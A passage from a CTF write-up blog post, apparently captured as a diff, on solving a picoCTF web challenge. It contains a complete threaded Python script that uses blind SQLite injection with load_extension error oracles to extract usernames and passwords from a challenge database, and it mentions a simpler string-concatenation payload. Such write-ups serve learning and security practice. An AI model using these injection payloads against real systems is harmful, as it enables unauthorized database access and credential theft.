+</span></span></code></pre></div><p>And we found that admin has the password <em>password</em>. Wow, great catch! I checked the second user, and it had a 21 letter long password, but that was something beginning with &ldquo;not_the..&rdquo; so I gave up.</p>
+<p>I ended up using threads and using binary search to iterate through all of the characters faster, since I decided to just print all of them. After fixing all the issues, and printing only the 6th element, FINALLY:</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/startupcompany-writeup/flag.png#center"></p>
+<p>The script is REALLY long:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> utils.pretty_print <span style="color:#f92672">import</span> pretty_print
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> concurrent.futures <span style="color:#f92672">import</span> ThreadPoolExecutor
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://wily-courier.picoctf.net:65033/contribute.php&#34;</span>
+</span></span><span style="display:flex;"><span>cookie <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;PHPSESSID&#34;</span>:<span style="color:#e6db74">&#34;d88487e473ccfd64de993d1917f4f422&#34;</span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>characters <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>ascii_letters <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">_&#34;</span>
+</span></span><span style="display:flex;"><span>charset <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(sorted(characters))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#threads... bc wtf.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#find the table row password&#39;s len (i being OFFSET)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#binary search</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">find_passlen</span>(i):
+</span></span><span style="display:flex;"><span>    left <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    right <span style="color:#f92672">=</span> <span style="color:#ae81ff">50</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span>(left<span style="color:#f92672">&lt;=</span>right):
+</span></span><span style="display:flex;"><span>        m <span style="color:#f92672">=</span> int((left<span style="color:#f92672">+</span>right)<span style="color:#f92672">/</span><span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>        substr_len_pass <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;(SELECT length(wordpass) FROM startup_users LIMIT 1 OFFSET </span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">)&gt;=</span><span style="color:#e6db74">{</span>m<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>        qstring <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;1&#39; AND CASE WHEN (</span><span style="color:#e6db74">{</span>substr_len_pass<span style="color:#e6db74">}</span><span style="color:#e6db74">) THEN 1 ELSE load_extension(1) END;--&#34;</span>
+</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;moneys&#34;</span>: qstring
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url, data<span style="color:#f92672">=</span>data, cookies<span style="color:#f92672">=</span>cookie)
+</span></span><span style="display:flex;"><span>        current <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span> <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;not authorized&#39;</span> <span style="color:#f92672">in</span> res<span style="color:#f92672">.</span>text <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> current:
+</span></span><span style="display:flex;"><span>            pos <span style="color:#f92672">=</span> m
+</span></span><span style="display:flex;"><span>            left <span style="color:#f92672">=</span> m <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            right <span style="color:#f92672">=</span> m <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> pos
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">find_userlen</span>(i):
+</span></span><span style="display:flex;"><span>    left <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    right <span style="color:#f92672">=</span> <span style="color:#ae81ff">30</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span>(left<span style="color:#f92672">&lt;=</span>right):
+</span></span><span style="display:flex;"><span>        m <span style="color:#f92672">=</span> int((left<span style="color:#f92672">+</span>right)<span style="color:#f92672">/</span><span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>        substr_len_pass <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;(SELECT length(nameuser) FROM startup_users LIMIT 1 OFFSET </span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">)&gt;=</span><span style="color:#e6db74">{</span>m<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>        qstring <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;1&#39; AND CASE WHEN (</span><span style="color:#e6db74">{</span>substr_len_pass<span style="color:#e6db74">}</span><span style="color:#e6db74">) THEN 1 ELSE load_extension(1) END;--&#34;</span>
+</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;moneys&#34;</span>: qstring
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url, data<span style="color:#f92672">=</span>data, cookies<span style="color:#f92672">=</span>cookie)
+</span></span><span style="display:flex;"><span>        current <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span> <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;not authorized&#39;</span> <span style="color:#f92672">in</span> res<span style="color:#f92672">.</span>text <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> current:
+</span></span><span style="display:flex;"><span>            pos <span style="color:#f92672">=</span> m
+</span></span><span style="display:flex;"><span>            left <span style="color:#f92672">=</span> m <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            right <span style="color:#f92672">=</span> m <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> pos
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">find_passchar</span>(i, k):
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#find entry k&#39;s letter i of the password</span>
+</span></span><span style="display:flex;"><span>    left <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    right <span style="color:#f92672">=</span> len(charset) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span>(left<span style="color:#f92672">&lt;=</span>right):
+</span></span><span style="display:flex;"><span>        m <span style="color:#f92672">=</span> int((left<span style="color:#f92672">+</span>right)<span style="color:#f92672">/</span><span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>        c <span style="color:#f92672">=</span> charset[m]
+</span></span><span style="display:flex;"><span>        substr_pass <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;(SELECT hex(substr(wordpass,</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">,1)) FROM startup_users LIMIT 1 OFFSET </span><span style="color:#e6db74">{</span>k<span style="color:#e6db74">}</span><span style="color:#e6db74">) &gt;= HEX(&#39;</span><span style="color:#e6db74">{</span>c<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;)&#34;</span>
+</span></span><span style="display:flex;"><span>        qstring <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;1&#39; AND CASE WHEN (</span><span style="color:#e6db74">{</span>substr_pass<span style="color:#e6db74">}</span><span style="color:#e6db74">) THEN 1 ELSE load_extension(1) END;--&#34;</span>
+</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;moneys&#34;</span>: qstring
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url, data<span style="color:#f92672">=</span>data, cookies<span style="color:#f92672">=</span>cookie)
+</span></span><span style="display:flex;"><span>        current <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span> <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;not authorized&#39;</span> <span style="color:#f92672">in</span> res<span style="color:#f92672">.</span>text <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> current:
+</span></span><span style="display:flex;"><span>            pos <span style="color:#f92672">=</span> c
+</span></span><span style="display:flex;"><span>            left <span style="color:#f92672">=</span> m<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            right<span style="color:#f92672">=</span>m<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> pos
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">find_userchar</span>(i, k):
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#find entry k&#39;s letter i of the password</span>
+</span></span><span style="display:flex;"><span>    left <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    right <span style="color:#f92672">=</span> len(charset) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span>(left<span style="color:#f92672">&lt;=</span>right):
+</span></span><span style="display:flex;"><span>        m <span style="color:#f92672">=</span> int((left<span style="color:#f92672">+</span>right)<span style="color:#f92672">/</span><span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>        c <span style="color:#f92672">=</span> charset[m]
+</span></span><span style="display:flex;"><span>        substr_pass <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;(SELECT hex(substr(nameuser,</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">,1)) FROM startup_users LIMIT 1 OFFSET </span><span style="color:#e6db74">{</span>k<span style="color:#e6db74">}</span><span style="color:#e6db74">) &gt;= HEX(&#39;</span><span style="color:#e6db74">{</span>c<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;)&#34;</span>
+</span></span><span style="display:flex;"><span>        qstring <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;1&#39; AND CASE WHEN (</span><span style="color:#e6db74">{</span>substr_pass<span style="color:#e6db74">}</span><span style="color:#e6db74">) THEN 1 ELSE load_extension(1) END;--&#34;</span>
+</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;moneys&#34;</span>: qstring
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url, data<span style="color:#f92672">=</span>data, cookies<span style="color:#f92672">=</span>cookie)
+</span></span><span style="display:flex;"><span>        current <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span> <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;not authorized&#39;</span> <span style="color:#f92672">in</span> res<span style="color:#f92672">.</span>text <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> current:
+</span></span><span style="display:flex;"><span>            pos <span style="color:#f92672">=</span> c
+</span></span><span style="display:flex;"><span>            left <span style="color:#f92672">=</span> m<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            right<span style="color:#f92672">=</span>m<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> pos
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">find_pass_user</span>(k):
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#first find len, then for each char of the len have a thread find it</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#we have 8 entries</span>
+</span></span><span style="display:flex;"><span>    passlen <span style="color:#f92672">=</span> find_passlen(k)
+</span></span><span style="display:flex;"><span>    userlen <span style="color:#f92672">=</span> find_userlen(k)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Found password length </span><span style="color:#e6db74">{</span>passlen<span style="color:#e6db74">}</span><span style="color:#e6db74"> and username length </span><span style="color:#e6db74">{</span>userlen<span style="color:#e6db74">}</span><span style="color:#e6db74"> for </span><span style="color:#e6db74">{</span>k<span style="color:#e6db74">}</span><span style="color:#e6db74">th user.&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> ThreadPoolExecutor(max_workers<span style="color:#f92672">=</span><span style="color:#ae81ff">30</span>) <span style="color:#66d9ef">as</span> executor:
+</span></span><span style="display:flex;"><span>        results_pass <span style="color:#f92672">=</span> list(executor<span style="color:#f92672">.</span>map(<span style="color:#66d9ef">lambda</span> i: find_passchar(i, k), range(<span style="color:#ae81ff">1</span>, passlen<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)))
+</span></span><span style="display:flex;"><span>        results_user <span style="color:#f92672">=</span> list(executor<span style="color:#f92672">.</span>map(<span style="color:#66d9ef">lambda</span> i: find_userchar(i, k), range(<span style="color:#ae81ff">1</span>, userlen<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)))
+</span></span><span style="display:flex;"><span>    password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(results_pass)
+</span></span><span style="display:flex;"><span>    username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(results_user)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Found password </span><span style="color:#e6db74">{</span>password<span style="color:#e6db74">}</span><span style="color:#e6db74"> and </span><span style="color:#e6db74">{</span>username<span style="color:#e6db74">}</span><span style="color:#e6db74"> for the </span><span style="color:#e6db74">{</span>k<span style="color:#e6db74">}</span><span style="color:#e6db74">th user.&#34;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#for each user, make a thread; dar user merge de la k, indexat de la 0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> ThreadPoolExecutor(max_workers<span style="color:#f92672">=</span><span style="color:#ae81ff">50</span>) <span style="color:#66d9ef">as</span> executor:
+</span></span><span style="display:flex;"><span>    executor<span style="color:#f92672">.</span>map(find_pass_user, range(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">8</span>))
+</span></span></code></pre></div><hr>
+<p>I looked at some other writeups, and I realised this was <em>not</em> that complicated to solve, and that we could get the server to print rows itself, by sending <code>moneys='||sqlite_version()'</code>. Either way, I feel like doing this myself was a great learning experience and I got to remind myself about binary search, lol.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/picoctf/">PicoCTF</a></li>
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/web/">Web</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="https://irinasusca.github.io/writeup-blog/">Irina&#39;s CTF Writeups</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
